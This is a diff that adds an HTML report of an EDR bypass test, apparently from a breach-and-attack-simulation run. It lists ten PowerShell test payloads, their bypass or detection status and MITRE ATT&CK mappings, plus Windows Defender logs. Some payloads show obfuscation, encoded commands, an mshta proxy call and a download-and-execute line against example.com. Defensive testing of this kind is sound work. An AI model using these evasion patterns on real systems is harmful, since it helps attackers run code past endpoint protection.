@@ -1,0 +1,93 @@
+<html>
+<head>
+    <title>EDR BAS Report</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #333; text-align: center; border-bottom: 3px solid #007acc; padding-bottom: 10px; }
+        .summary { display: flex; justify-content: space-around; margin: 20px 0; }
+        .stat-box { text-align: center; padding: 15px; border-radius: 8px; min-width: 100px; }
+        .success { background-color: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
+        .failed { background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
+        .timeout { background-color: #fff3cd; border: 1px solid #ffeaa7; color: #856404; }
+        .total { background-color: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; }
+        table { width: 100%; max-width: 100%; border-collapse: collapse; margin-top: 20px; table-layout: fixed; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; word-wrap: break-word; overflow-wrap: break-word; }
+        th { background-color: #007acc; color: white; position: sticky; top: 0; }
+        tr:hover { background-color: #f5f5f5; }
+        .payload-cell { width: 45%; max-width: 300px; word-wrap: break-word; font-family: monospace; font-size: 12px; }
+        th:nth-child(1), td:nth-child(1) { width: 45%; }
+        th:nth-child(2), td:nth-child(2) { width: 12%; }
+        th:nth-child(3), td:nth-child(3) { width: 10%; }
+        th:nth-child(4), td:nth-child(4) { width: 33%; font-size: 11px; }
+        .status-success { color: #28a745; font-weight: bold; }
+        .status-failed { color: #dc3545; font-weight: bold; }
+        .status-timeout { color: #ffc107; font-weight: bold; }
+        .logs-section { margin-top: 30px; }
+        .logs-content { background-color: #f8f9fa; padding: 15px; border-radius: 5px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; }
+        .filter-controls { margin: 20px 0; }
+        .filter-btn { padding: 8px 15px; margin: 5px; border: none; border-radius: 4px; cursor: pointer; }
+        .filter-btn.active { background-color: #007acc; color: white; }
+        .filter-btn:not(.active) { background-color: #e9ecef; color: #333; }
+    </style>
+    <script>
+        function filterTable(status) {
+            const rows = document.querySelectorAll('#resultsTable tbody tr');
+            const buttons = document.querySelectorAll('.filter-btn');
+            
+            // Update button states
+            buttons.forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            rows.forEach(row => {
+                if (status === 'all' || row.cells[1].textContent.includes(status)) {
+                    row.style.display = '';
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+        }
+        
+        function toggleLogs() {
+            const logsDiv = document.getElementById('logsSection');
+            logsDiv.style.display = logsDiv.style.display === 'none' ? 'block' : 'none';
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+<h1>🛡️ EDR Bypass Test Results</h1>
+<p style='text-align: center; color: #666; font-size: 14px;'>Test Date: 2025-07-17 11:07:08</p>
+<p style='text-align: center; color: #007acc; font-size: 16px; font-weight: bold; margin: 10px 0;'>Local System</p>
+<div class='summary'>
+<div class='stat-box total'><h3>10</h3><p>Total Payloads</p></div>
+<div class='stat-box success'><h3>8</h3><p>Successful</p></div>
+<div class='stat-box failed'><h3>2</h3><p>Failed</p></div>
+<div class='stat-box timeout'><h3>0</h3><p>Timeout</p></div>
+</div>
+<div class='filter-controls'>
+<strong>Filter Results:</strong>
+<button class='filter-btn active' onclick='filterTable("all")'>All</button>
+<button class='filter-btn' onclick='filterTable("✅ Bypassed")'>Bypassed</button>
+<button class='filter-btn' onclick='filterTable("❌ Detected")'>Detected</button>
+<button class='filter-btn' onclick='filterTable("⏰ Timeout")'>Timeout</button>
+</div>
+<table id='resultsTable'>
+<thead><tr><th>Payload</th><th>Status</th><th>Return Code</th><th>MITRE Details</th></tr></thead>
+<tbody>
+<tr><td class='payload-cell'>Start-Process calc.exe</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1059.001 - Command and Scripting Interpreter: PowerShell (Execution)</td></tr>
+<tr><td class='payload-cell'>Write-Output "Simulated payload: Hello world"</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1059.001 - Command and Scripting Interpreter: PowerShell (Execution)</td></tr>
+<tr><td class='payload-cell'>Invoke-Expression ("W"+"ri"+"te-Output 'Obfuscated test'")</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1027 - Obfuscated Files or Information (Defense Evasion)</td></tr>
+<tr><td class='payload-cell'>Start-Sleep -Seconds 3</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1562.006 - Indicator Blocking (Defense Evasion)</td></tr>
+<tr><td class='payload-cell'>$cmd = 'notepad'; Start-Process $cmd</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1202 - Indirect Command Execution (Execution)</td></tr>
+<tr><td class='payload-cell'>powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1027.001 - Obfuscated Files or Information: Command Obfuscation (Defense Evasion)</td></tr>
+<tr><td class='payload-cell'>Start-Process mshta.exe -ArgumentList "javascript:eval('alert(\"LOLBIN test\")')"</td><td class='status-failed'>❌ Detected</td><td>1</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1218.005 - Signed Binary Proxy Execution: Mshta (Execution)</td></tr>
+<tr><td class='payload-cell'>$cmd = ('c'+'a'+'l'+'c'+'.'+'e'+'x'+'e'); Start-Process $cmd</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1027 - Obfuscated Files or Information (Defense Evasion)</td></tr>
+<tr><td class='payload-cell'>IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')</td><td class='status-failed'>❌ Detected</td><td>1</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1105 - Ingress Tool Transfer (Command and Control)</td></tr>
+<tr><td class='payload-cell'>Set-Alias p Start-Process; p notepad.exe</td><td class='status-success'>✅ Bypassed</td><td>0</td><td style='font-family: monospace; font-weight: bold; color: #007acc;'>T1036.003 - Masquerading (Defense Evasion)</td></tr>
+</tbody></table>
+<div class='logs-section'>
+<h2>🔍 Recent Windows Defender Logs <button onclick='toggleLogs()' style='margin-left: 10px; padding: 5px 10px; background-color: #007acc; color: white; border: none; border-radius: 3px; cursor: pointer;'>Toggle</button></h2>
+<div id='logsSection' class='logs-content'><br><br>TimeCreated : 5/29/2025 1:00:36 PM<br>Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.<br>               For more information please see the following:<br>              https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/MaleficAms.J&threatid=2147938223&enterp<br>              rise=1<br>               	Name: Behavior:Win32/MaleficAms.J<br>               	ID: 2147938223<br>               	Severity: Severe<br>               	Category: Suspicious Behavior<br>               	Path: behavior:_process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, <br>              pid:14496:23862558783435; process:_pid:14496,ProcessStart:133930152349116104<br>               	Detection Origin: Unknown<br>               	Detection Type: Concrete<br>               	Detection Source: Unknown<br>               	User: <br>               	Process Name: Unknown<br>               	Security intelligence Version: AV: 1.429.240.0, AS: 1.429.240.0, NIS: 1.429.240.0<br>               	Engine Version: AM: 1.1.25040.1, NIS: 1.1.25040.1<br><br>TimeCreated : 5/29/2025 1:00:36 PM<br>Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.<br>               For more information please see the following:<br>              https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/SuspClickFix.C&threatid=2147939005&ente<br>              rprise=1<br>               	Name: Behavior:Win32/SuspClickFix.C<br>               	ID: 2147939005<br>               	Severity: Severe<br>               	Category: Suspicious Behavior<br>               	Path: behavior:_process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, <br>              pid:14496:41451832522505; process:_pid:14496,ProcessStart:133930152349116104<br>               	Detection Origin: Unknown<br>               	Detection Type: Concrete<br>               	Detection Source: Unknown<br>               	User: <br>               	Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br>               	Security intelligence Version: AV: 1.429.240.0, AS: 1.429.240.0, NIS: 1.429.240.0<br>               	Engine Version: AM: 1.1.25040.1, NIS: 1.1.25040.1<br><br>TimeCreated : 5/29/2025 1:00:35 PM<br>Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.<br>               For more information please see the following:<br>              https://go.microsoft.com/fwlink/?linkid=37020&name=Behavior:Win32/SuspClickFix.C&threatid=2147939005&ente<br>              rprise=1<br>               	Name: Behavior:Win32/SuspClickFix.C<br>               	ID: 2147939005<br>               	Severity: Severe<br>               	Category: Suspicious Behavior<br>               	Path: behavior:_process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, <br>              pid:14496:41451832522505; process:_pid:14496,ProcessStart:133930152349116104<br>               	Detection Origin: Unknown<br>               	Detection Type: Concrete<br>               	Detection Source: Unknown<br>               	User: <br>               	Process Name: Unknown<br>               	Security intelligence Version: AV: 1.429.240.0, AS: 1.429.240.0, NIS: 1.429.240.0<br>               	Engine Version: AM: 1.1.25040.1, NIS: 1.1.25040.1<br><br><br><br></div>
+</div>
+</div></body></html>
